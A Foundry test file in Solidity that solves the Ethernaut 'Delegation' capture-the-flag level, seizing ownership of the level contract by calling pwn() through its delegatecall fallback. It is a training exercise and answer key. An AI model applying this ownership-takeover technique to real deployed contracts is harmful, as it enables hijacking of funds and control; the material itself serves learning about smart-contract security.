// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Delegation/DelegationFactory.sol";
import "../src/Ethernaut.sol";

contract DelegationTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testDelegationHack() public {
        /****************
         * Factory setup *
         *************** */
        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress)); // 1000 is initial supply
        /****************
         *    Attack     *
         *************** */
        console.log(ethernautDelegation.owner());
        (bool success, ) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "call failed");
        console.log(ethernautDelegation.owner());
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
